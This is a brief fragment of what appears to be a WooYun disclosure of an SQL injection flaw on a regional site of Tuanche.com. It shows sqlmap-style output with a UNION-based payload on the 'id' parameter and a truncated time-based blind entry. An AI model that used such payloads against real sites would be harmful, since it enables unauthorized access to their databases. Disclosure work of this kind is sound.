wybug_title: 团车网某分站SQL注入漏洞

columns    Payload: id=4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716e7a7371,0x697867526e714b714966,0x716d617571),NULL,NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL >
